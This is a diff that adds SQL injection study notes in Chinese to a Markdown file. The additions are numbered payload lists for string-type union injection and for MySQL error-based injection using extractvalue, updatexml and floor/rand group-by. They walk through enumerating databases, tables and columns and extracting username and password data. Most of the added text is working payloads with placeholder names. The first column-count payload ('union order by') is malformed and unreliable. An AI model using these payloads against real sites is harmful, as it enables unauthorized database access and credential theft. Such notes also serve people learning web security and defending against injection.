@@ -74,7 +74,34 @@ table_schema:表名称字段
 6:查询表下的列名字段:`?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='表名' `  
 7:查询数据:`id=-1' union select 1,2,group_concat(username,password) from 表名`
 #### 字符型注入：
+注入步骤： 
+1:查询字段数： `?id=1' union order by 3 #`  
+2:判断回显位：`?id=-1' union select 1,2,3 #`  
+3:查询当前数据库名：`?id=-1' union select 1,2,database() #`  
+4:查询所有数据库名:`?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata #`  
+5：查询数据库下的表名：`?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='库名' #`  
+6:查询表下的列名字段:`?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='表名' #`  
+7:查询数据:`id=-1' union select 1,2,group_concat(username,password) from 表名 #` 
 #### 报错注入：
+mysql5.1.5 开始，提供两个 XML 查询和修改的函数：extractvalue 和 updatexml。extractvalue 负责在 xml 文档中按照 xpath 语法查询节点内容，updatexml 则负责修改查询到的内容。
+用法上extractvalue与updatexml的区别：updatexml使用三个参数，extractvalue只有两个参数。还有一种就是floor实现的group by主键重复
+extractvalue注入步骤(整数型)：  
+1:查库名:`1 and (select extractvalue(1, concat(0x7e, (select database()))))`  
+2:查表名:`1 and (select extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema= '库名'))))`  
+3:查列名:`1 and (select extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name= '表名'))))`  
+4:查数据:`1 and (select extractvalue(1, concat(0x7e, (select 字段名 from 表名))))`  
+
+updatexml注入步骤(整数型):  
+1:查库名:`1 and (select updatexml(1, (concat (0x7e, (select database()))),1))`  
+2:查表名:`1 and (select updatexml(1, (concat (0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='库名'))),1)) `  
+3:查列名:`1 and (select updatexml(1, (concat (0x7e, (select group_concat(column_name) from information_schema.columns where table_name='表名'))),1)) `  
+4:查数据:`1 and (select updatexml(1, concat(0x7e, (select 字段名 from 表名)), 1))`  
+
+floor注入步骤(仅参考):
+`1 union select count(*), concat((select database()), floor(rand(0)*2)) x from news group by x`
+`1 union select count(*), concat((select table_name from information_schema.tables where table_schema='库名' limit 1,1), floor(rand(0)*2)) x from news group by x`
+`1 union select count(*), concat((select column_name from information_schema.columns where table_name='表名' limit 0,1), floor(rand(0)*2)) x from news group by x`
+`1 union select count(*), concat((select 字段名 from 表名 limit 0,1), floor(rand(0)*2)) x from news group by x`
 #### 布尔型注入：
 #### 时间盲注：
 mysql结构：
